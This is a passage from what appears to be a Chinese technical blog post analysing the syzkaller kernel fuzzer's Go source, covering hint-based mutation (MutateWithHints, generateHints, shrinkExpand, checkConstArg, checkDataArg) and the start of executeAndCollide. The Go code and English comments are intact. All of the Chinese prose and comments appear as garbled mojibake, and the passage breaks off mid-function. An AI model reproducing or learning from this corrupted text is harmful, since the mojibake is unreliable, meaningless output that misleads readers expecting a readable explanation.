p, ProgNormal, StatSeed)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// æ¥ä¸‹æ¥ä¸ºæ¯ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°äºä¸€ä¸ªæ¯”è¾ƒæ“ä½œæ•°çš„åŒ¹é…å¯¹å˜å¼‚åŸå§‹ç¨‹åº.</span><br><span class="hljs-comment">// æ‰§è¡Œæ¯ä¸€ä¸ªè¿™æ ·çš„å˜å¼‚ï¼Œä»¥æ£€æŸ¥æ˜¯å¦ç»™å‡ºäº†æ–°çš„è¦†ç›–ç‡.</span><br>p.MutateWithHints(call, info.Calls[call].Comps, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *prog.Prog)</span></span> &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: executing comparison hint&quot;</span>, proc.pid)<br>proc.execute(proc.execOpts, p, ProgNormal, StatHint)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>MutateWithHints()</code> å½“ä¸­è¾“å…¥è¿›ç¨‹ä¼šå…ˆè¢«å…‹éš†ä¸€ä»½ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨ <code>ForeachArg</code> éå†æŒ‡å®šç³»ç»Ÿè°ƒç”¨ä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œå¹¶ä¼ å…¥äº†ä¸€äº›é—­åŒ…å‡½æ•°å¥—å¨ƒï¼ˆå¥—ä¸­å¥—ä¸­å¥—å±äºæ˜¯ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ä½¿ç”¨å­˜å‚¨åœ¨ compMapsä¸­çš„æ¯”è¾ƒæ“ä½œæ•°å˜å¼‚ç¨‹åº.</span><br><span class="hljs-comment">// å¯¹äºæ¯ä¸ªå˜ç§ï¼Œæ‰§è¡Œ exec å›è°ƒ.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> MutateWithHints(callIndex <span class="hljs-type">int</span>, comps CompMap, exec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Prog)</span></span>) &#123;<br>p = p.Clone()<br>c := p.Calls[callIndex]<br>execValidate := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// ä¸è¦å°è¯•ä¿®å¤ candidate ç¨‹åº.</span><br><span class="hljs-comment">// å‡è®¾åŸæ¥çš„è°ƒç”¨è¢« sanitized, æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªåçš„è°ƒç”¨ä½œä¸º hint çš„æ›¿ä»£ç»“æœï¼Œå°†å…¶ä¸¢æ‰å°±è¡Œ.</span><br><span class="hljs-keyword">if</span> p.Target.sanitize(c, <span class="hljs-literal">false</span>) != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>p.debugValidate()<br>exec(p)<br>&#125;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, _ *ArgCtx)</span></span> &#123;<br>generateHints(comps, arg, execValidate)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼äºæˆ‘ä»¬ä¸Šæ–‡åˆ†æçš„ <code>ForeachType()</code>ï¼Œ<code>ForeachArg()</code> ä¼šä¸ºè¯¥è°ƒç”¨çš„è¿”å›å€¼ä¸æ¯ä¸€ä¸ªå‚æ•°éƒ½è°ƒç”¨ <code>foreachArgImpl()</code>ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ä¸Šå±‚ä¼ å…¥çš„é—­åŒ… <code>generateHints()</code>ï¼Œæ¥ä¸‹æ¥ä¼šæ ¹æ®å‚æ•°ç±»å‹è¿›è¡Œä¸åŒæ“ä½œï¼š</p><ul><li><code>GroupArg</code> ï¼ˆé€»è¾‘ä¸Šçš„ä¸€ç»„å‚æ•°ï¼Œå³<strong>ç»“æ„ä½“</strong>ä¸<strong>æ•°ç»„</strong>ï¼‰ï¼šè·å–å¹¶éå†å…¶ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼Œé€’å½’è°ƒç”¨ <code>foreachArgImpl()</code></li><li><code>PointerArg</code> ï¼ˆæŒ‡é’ˆç±»å‹ï¼‰ï¼šåˆ¤æ–­å…¶æŒ‡å‘ ï¼ˆpointeeï¼‰æ˜¯å¦ä¸º nilï¼Œè‹¥å¦ï¼Œé€’å½’è°ƒç”¨ <code>foreachArgImpl()</code></li><li><code>UnionArg</code>  ï¼ˆè”åˆä½“ç±»å‹ï¼‰ï¼šé€’å½’è°ƒç”¨ <code>foreachArgImpl()</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachArg</span><span class="hljs-params">(c *Call, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx := &amp;ArgCtx&#123;&#125;<br><span class="hljs-keyword">if</span> c.Ret != <span class="hljs-literal">nil</span> &#123;<br>foreachArgImpl(c.Ret, ctx, f)<br>&#125;<br>ctx.Parent = &amp;c.Args<br>ctx.Fields = c.Meta.Args<br><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> c.Args &#123;<br>foreachArgImpl(arg, ctx, f)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachArgImpl</span><span class="hljs-params">(arg Arg, ctx *ArgCtx, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx0 := *ctx<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; *ctx = ctx0 &#125;()<br>f(arg, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *GroupArg:<br>overlayField := <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> typ, ok := a.Type().(*StructType); ok &#123;<br>ctx.Parent = &amp;a.Inner<br>ctx.Fields = typ.Fields<br>overlayField = typ.OverlayField<br>&#125;<br><span class="hljs-keyword">var</span> totalSize <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> i, arg1 := <span class="hljs-keyword">range</span> a.Inner &#123;<br><span class="hljs-keyword">if</span> i == overlayField &#123;<br>ctx.Offset = ctx0.Offset<br>&#125;<br>foreachArgImpl(arg1, ctx, f)<br>size := arg1.Size()<br>ctx.Offset += size<br><span class="hljs-keyword">if</span> totalSize &lt; ctx.Offset &#123;<br>totalSize = ctx.Offset - ctx0.Offset<br>&#125;<br>&#125;<br>claimedSize := a.Size()<br>varlen := a.Type().Varlen()<br><span class="hljs-keyword">if</span> varlen &amp;&amp; totalSize &gt; claimedSize || !varlen &amp;&amp; totalSize != claimedSize &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad group arg size %v, should be &lt;= %v for %#v type %#v&quot;</span>,<br>totalSize, claimedSize, a, a.Type().Name()))<br>&#125;<br><span class="hljs-keyword">case</span> *PointerArg:<br><span class="hljs-keyword">if</span> a.Res != <span class="hljs-literal">nil</span> &#123;<br>ctx.Base = a<br>ctx.Offset = <span class="hljs-number">0</span><br>foreachArgImpl(a.Res, ctx, f)<br>&#125;<br><span class="hljs-keyword">case</span> *UnionArg:<br>foreachArgImpl(a.Option, ctx, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ <code>generateHints()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ <code>Arg</code> æ¥å£çš„ <code>Type()</code> å‡½æ•°è·å–ç±»å‹å¹¶è¿›è¡Œåˆ¤æ–­ï¼Œå¯¹äºå¤§éƒ¨åˆ†ç±»å‹å¥½åƒéƒ½æ˜¯ç›´æ¥è¿”å›ï¼Œä»…æœ‰ä»¥ä¸‹é€šè¿‡ï¼š</p><ul><li><code>ConstType</code>ï¼šä¼šæ£€æŸ¥ <code>IsPad</code> æ ‡å¿—ä½ï¼Œè‹¥ä¸ä¸ºçœŸæ‰ä¼šç»§ç»­</li><li><code>BufferType</code> ä¸­çš„ <code>BufferString, BufferGlob</code>ï¼šä¼šæ£€æŸ¥å€¼çš„é•¿åº¦ï¼Œä¸º 0 æ‰ä¼šç»§ç»­</li><li>å…¶ä»–çš„ä¸åœ¨å¦‚ä¸‹ä»£ç ä¸­çš„ç±»å‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">generateHints</span><span class="hljs-params">(compMap CompMap, arg Arg, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>typ := arg.Type()<br><span class="hljs-keyword">if</span> typ == <span class="hljs-literal">nil</span> || arg.Dir() == DirOut &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> t := typ.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ProcType:<br><span class="hljs-comment">// éšæœºçš„ç¨‹åºä¸ä¼šé€šè¿‡éªŒè¯.</span><br><span class="hljs-comment">// æˆ‘ä»¬å¯ä»¥å°†å…¶å˜å¼‚ï¼Œä½†ä»…å½“ç»“æœå€¼åœ¨åˆæ³•èŒƒå›´å†….</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *ConstType:<br><span class="hljs-keyword">if</span> IsPad(typ) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">case</span> *CsumType:<br><span class="hljs-comment">// Csum å°†ä¸ä¼šé€šè¿‡éªŒè¯ï¼Œä¸”æ€»ä¼šè¢«è®¡ç®—.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> t.Kind &#123;<br><span class="hljs-keyword">case</span> BufferFilename:<br><span class="hljs-comment">// å…¶å¯ä»¥ç”Ÿæˆé€ƒé€¸è·¯å¾„ï¼Œä¸”é€šå¸¸ä¸ä¼šå¤ªæœ‰ç”¨.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t.Values) != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// è¿™äº›é€šå¸¸æ˜¯æ–‡ä»¶åæˆ–å®Œæ•´çš„æšä¸¾ã€‚</span><br><span class="hljs-comment">// è‹¥æˆ‘ä»¬æ‹¦æˆª strcmpï¼Œå°†å…¶å˜å¼‚å¯èƒ½æ˜¯æœ‰ç”¨çš„</span><br><span class="hljs-comment">// (å¹¶è¿‡æ»¤æ‰æ–‡ä»¶å).</span><br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> æœ€åä¼šæ ¹æ®å‚æ•°å®é™…çš„å­˜å‚¨ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼š</p><ul><li>å¯¹äºå¸¸é‡å‚æ•° <code>ConstArg</code> ç±»å‹ä¼šè°ƒç”¨ <code>checkConstArg()</code> å¤„ç†</li><li>å¯¹äºæ•°æ®å‚æ•° <code>DataArg</code> ç±»å‹ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜¯å¦ä¸º <code>BufferCompressed</code> ç±»å‹ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>checkCompressedArg()</code> ï¼Œå¦åˆ™è°ƒç”¨ <code>checkDataArg()</code> å¤„ç†</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ConstArg:<br>checkConstArg(a, compMap, exec)<br><span class="hljs-keyword">case</span> *DataArg:<br><span class="hljs-keyword">if</span> typ.(*BufferType).Kind == BufferCompressed &#123;<br>checkCompressedArg(a, compMap, exec)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>checkDataArg(a, compMap, exec)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªå‡½æ•°éƒ½ä¼šè°ƒç”¨åˆ° <code>shrinkExpand()</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„å®ç°ï¼Œè¯¥å‡½æ•°ç”¨ä»¥<strong>ä½¿ç”¨ç»™å®šçš„ CompMap å¯¹å‚æ•°è¿›è¡Œæ›¿æ¢ï¼Œè¿”å›ç»“æœä¸ºå¯ä»¥ç”¨æ¥è¿›è¡Œæ›¿æ¢çš„æ–°å‚æ•°å€¼</strong>ï¼Œå…¶å…·ä½“å®ç°æˆ‘ä»¬å°±ä¸æ·±å…¥äº†ï¼Œè¿™é‡Œæ¥çœ‹æ³¨é‡Šï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Shrink and expand mutations åœ¨å½“ç³»ç»Ÿè°ƒç”¨å‚æ•°è¢«è½¬åŒ–ä¸ºæ›´ç‹­çª„ï¼ˆä¸æ›´å®½é˜”ï¼‰çš„æ•´å‹ç±»å‹æ—¶</span><br><span class="hljs-comment">// å¯¹è¿™äº›æƒ…å†µè¿›è¡Œå»ºæ¨¡.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// æ”¶ç¼©çš„åŠ¨æœº:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(u16 x) &#123;</span><br><span class="hljs-comment">//u8 y = (u8)x;</span><br><span class="hljs-comment">//if (y == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// è‹¥æˆ‘ä»¬è°ƒç”¨ f(0x1234), æˆ‘ä»¬å°†çœ‹åˆ°åœ¨ 0x34 ä¸ 0xab é—´çš„æ¯”è¾ƒï¼Œ</span><br><span class="hljs-comment">// æˆ‘ä»¬å°†æ²¡æ³•å°†å‚æ•° 0x1234 ä¸ä»»ä½•æ¯”è¾ƒæ“ä½œæ•°åŒ¹é….</span><br><span class="hljs-comment">// ç”±æ­¤æˆ‘ä»¬å°† 0x1234 æ”¶ç¼©åˆ° 0x34 å¹¶å°è¯•åŒ¹é… 0x34.</span><br><span class="hljs-comment">// è‹¥å¯¹äºæ”¶ç¼©åçš„å€¼å­˜åœ¨ä¸€ä¸ªåŒ¹é…ï¼Œåˆ™æˆ‘ä»¬æ›¿æ¢è¾“å…¥ä¸­ç›¸åº”çš„å­—èŠ‚</span><br><span class="hljs-comment">//  (åœ¨ç»™å‡ºçš„ä¾‹å­ä¸­æˆ‘ä»¬å°†è·å¾— 0x12ab).</span><br><span class="hljs-comment">// æœ‰çš„æ—¶å€™å…¶ä»–çš„æ¯”è¾ƒæ“ä½œæ•°å°†æ¯”æ”¶ç¼©åçš„å€¼è¦å®½</span><br><span class="hljs-comment">// (åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­è€ƒè™‘æ¯”è¾ƒ if (y == 0xdeadbeef) &#123;...&#125;).</span><br><span class="hljs-comment">// è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¿½ç•¥è¿™æ ·çš„æ¯”è¾ƒå› ä¸ºæˆ‘ä»¬æ— æ³•ç»™å‡ºåšç€ç±»ä¼¼äº‹æƒ…çš„åˆæ³•ä»£ç ğŸŒ°.</span><br><span class="hljs-comment">// ä¸ºäº†é¿å…è¿™æ ·çš„æ¯”è¾ƒï¼Œæˆ‘ä»¬æˆ‘ä»¬ä½¿ç”¨ leastSize() æ£€æŸ¥å…¶ size. </span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// æ‰©å±•çš„åŠ¨æœº:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(i8 x) &#123;</span><br><span class="hljs-comment">//i16 y = (i16)x;</span><br><span class="hljs-comment">//if (y == -2) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// å‡å¦‚æˆ‘ä»¬è°ƒç”¨ f(-1), æˆ‘ä»¬å°†çœ‹åˆ°åœ¨ 0xffff ä¸ 0xfffe é—´çš„æ¯”è¾ƒï¼Œ</span><br><span class="hljs-comment">// å¹¶æ— æ³•å°†è¾“å…¥ä¸ä»»ä½•æ“ä½œæ•°åŒ¹é…. ç”±æ­¤æˆ‘ä»¬å¯¹è¾“å…¥è¿›è¡Œç¬¦å·æ‰©å±•å¹¶æ£€æŸ¥æ‰©å±•.</span><br><span class="hljs-comment">// ä¸æ”¶ç¼©ä¸€æ ·ï¼Œæˆ‘ä»¬å¿½ç•¥äº†å¦ä¸€ä¸ªæ“ä½œæ•°æ›´å®½çš„æƒ…å†µ.</span><br><span class="hljs-comment">// éœ€è¦æ³¨æ„çš„æ˜¯ executor å°†æ‰€æœ‰çš„æ¯”è¾ƒæ“ä½œæ•°ç¬¦å·æ‰©å±•è‡³ int64.</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹è¿™ä¸‰ä¸ª <code>check*Arg()</code> ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹ç”¨æ¥å¤„ç†å¸¸é‡çš„ <code>checkConstArg()</code>ï¼Œä¸»è¦é€»è¾‘æ˜¯å—²ç”¨ <code>shrinkExpand()</code> å¹¶å¯¹å…¶ç»“æœï¼ˆ<code>CompMap</code> ç±»å‹ï¼‰è¿›è¡Œéå†ï¼Œå°† <code>arg.Val</code> ä¾æ¬¡æ›¿æ¢ä¸ºå…¶æä¾›çš„ replacer å€¼ï¼Œå¹¶è°ƒç”¨ä¸Šå±‚å›è°ƒå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯ <code>execValidate()</code> ï¼Œé‡Œé¢è¿˜ä¼šè°ƒç”¨ä¸Šå±‚ä¼ å…¥çš„é—­åŒ…å‡½æ•°ï¼Œæœ€åä¼šè°ƒç”¨ <code>proc.execute()</code> ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>å¯¹äº shrinkExpand() æä¾›çš„æ¯ä¸ªæ›¿æ¢ç»“æœå…¶éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡</strong>ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkConstArg</span><span class="hljs-params">(arg *ConstArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>original := arg.Val<br><span class="hljs-comment">// Note: because shrinkExpand returns a map, order of programs is non-deterministic.</span><br><span class="hljs-comment">// This can affect test coverage reports.</span><br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(original, compMap, arg.Type().TypeBitSize(), <span class="hljs-literal">false</span>) &#123;<br>arg.Val = replacer<br>exec()<br>&#125;<br>arg.Val = original<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çœ‹ <code>checkCompressedArg()</code> ï¼Œä¸»è¦å°±æ˜¯å°†æ•°æ®è§£å‹åé€ 4 å­—èŠ‚è¿›è¡Œéå†ï¼Œæ¯æ¬¡éå†æ—¶éƒ½ä¼šå†è°ƒç”¨ <code>shrinkExpand()</code> è·å–å¯æ›¿æ¢å€¼å¹¶å†å¯¹å…¶ç»“æœè¿›è¡Œéå†ï¼Œè°ƒç”¨ä¸Šå±‚ä¼ å…¥çš„é—­åŒ…å‡½æ•°æ‰§è¡Œæ›¿æ¢æ•°æ®åçš„ç¨‹åºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkCompressedArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>data0 := arg.Data()<br>data, dtor := image.MustDecompress(data0)<br><span class="hljs-keyword">defer</span> dtor()<br><span class="hljs-comment">// Images are very large so the generic algorithm for data arguments</span><br><span class="hljs-comment">// can produce too many mutants. For images we consider only</span><br><span class="hljs-comment">// 4/8-byte aligned ints. This is enough to handle all magic</span><br><span class="hljs-comment">// numbers and checksums. We also ignore 0 and ^uint64(0) source bytes,</span><br><span class="hljs-comment">// because there are too many of these in lots of images.</span><br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(data); i += <span class="hljs-number">4</span> &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">true</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>arg.SetData(image.Compress(data))<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>arg.SetData(data0)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>checkDataArg()</code> é€»è¾‘åŸºæœ¬ä¸Šä¸ <code>checkCompressedArg()</code> ä¸€è‡´ï¼Œä¸è¿‡æ˜¯é€å­—èŠ‚éå†ä¸”æ²¡æœ‰è§£å‹è¿‡ç¨‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkDataArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br>data := arg.Data()<br>size := <span class="hljs-built_in">len</span>(data)<br><span class="hljs-keyword">if</span> size &gt; maxDataLength &#123;<br>size = maxDataLength<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; size; i++ &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">false</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="proc-executeAndCollide-ï¼šç®€æ˜“çš„å˜å¼‚æ‰§è¡Œï¼š"><a href="#proc-executeAndCollide-ï¼šç®€æ˜“çš„å˜å¼‚æ‰§è¡Œï¼š" class="headerlink" title="proc.executeAndCollide()ï¼šç®€æ˜“çš„å˜å¼‚æ‰§è¡Œï¼š"></a>proc.executeAndCollide()ï¼šç®€æ˜“çš„å˜å¼‚æ‰§è¡Œï¼š</h4><p>è¯¥å‡½æ•°çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆä¼šå°†ç¨‹åºæ‰§è¡Œä¸€æ¬¡ï¼Œä¹‹åå¾ªç¯æ‰§è¡Œä¸¤æ¬¡ï¼Œä¸è¿‡ä¼šè°ƒç”¨ <code>proc.randomCollide()</code> å…ˆå°†åŸå§‹ç¨‹åºè¿›è¡Œå¤„ç†åå†æ‰§è¡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeAndCollide(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) &#123;<br>proc.execute(execOpts, p, flags, stat)<br><br><span class="hljs-keyword">if</span> proc.execOptsCollide.Flags&amp;ipc.FlagThreaded == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// We cannot collide syscalls without being in the threaded mode.</span><br><span 